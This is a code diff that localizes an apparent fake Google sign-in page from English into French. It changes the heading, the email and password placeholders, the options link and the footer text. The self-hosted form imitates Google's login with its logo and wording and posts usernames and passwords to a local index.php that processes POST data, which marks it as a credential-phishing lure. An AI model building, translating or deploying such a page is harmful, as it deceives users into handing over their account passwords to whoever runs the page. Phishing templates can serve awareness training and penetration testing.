@@ -19,16 +19,16 @@ if (!empty($_POST)) {
 <body>
 <form novalidate action="index.php" method="post">
 	<img src="google_logo.gif" alt="">
-	<h1>Sign in</h1>
-	<h2>with your Google Account</h2>
-	<input id="user" type="text" name="username" placeholder="Enter your email">
-	<input type="password" name="password" placeholder="Enter your password">
+	<h1>Connexion</h1>
+	<h2>avec votre compte Google</h2>
+	<input id="user" type="text" name="username" placeholder="Entrez votre email">
+	<input type="password" name="password" placeholder="Entrez votre mot de passe">
 	<p class="warning"><?php echo !empty($err)?$err:"&nbsp;";?></p>
-	<p><a href="">More options</a><span class="text-right"><button type="Submit">NEXT</button></span></p>
+	<p><a href="">Plus d'options</a><span class="text-right"><button type="Submit">NEXT</button></span></p>
 </form>
 <footer>
-	English (United States) <img src="caret.gif" alt="">
-	<span class="text-right">Help&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Privacy&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Terms</span>
+	France (France) <img src="caret.gif" alt="">
+	<span class="text-right">Aide&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Vie privée&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;CGU</span>
 </footer>
 <script>document.onload = function() { document.getElementById("user").focus();};</script>
 </body>
